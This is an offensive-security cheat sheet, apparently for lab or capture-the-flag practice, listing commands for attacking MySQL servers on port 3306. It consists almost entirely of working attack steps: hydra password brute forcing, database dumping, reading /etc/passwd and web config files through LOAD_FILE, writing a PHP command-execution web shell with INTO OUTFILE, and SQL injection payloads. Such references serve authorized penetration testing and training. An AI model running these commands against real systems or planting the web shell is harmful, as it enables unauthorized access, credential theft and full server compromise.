# MySQL Enumeration (3306)

## Run nmap MySQL scripts
```bash
nmap --script=mysql-* -p 3306 $IP
```

## Connect to MySQL
```bash
mysql -h $IP -u root
mysql -h $IP -u root -p
```

## Brute force MySQL with hydra
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt $IP mysql
```

## Dump a database
```bash
mysqldump -h $IP -u root -ppassword database_name > dump.sql
```

## Show version and current user
```sql
SELECT version();
SELECT user();
SELECT database();
```

## List databases and tables
```sql
SHOW databases;
SHOW tables;
USE database_name;
SHOW tables;
```

## List grants
```sql
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();
```

## Check FILE privilege
```sql
SELECT user, file_priv FROM mysql.user WHERE file_priv='Y';
SHOW variables LIKE 'secure_file_priv';
```

## Read files with LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

## Write a web shell with INTO OUTFILE
```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## Search for interesting tables and columns
```sql
SHOW tables LIKE '%user%';
SHOW tables LIKE '%pass%';
SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';
```

## Export query results to CSV
```sql
SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

## SQLi if the web app uses MySQL
```text
' OR 1=1--
" OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT user(),database(),version()--
```
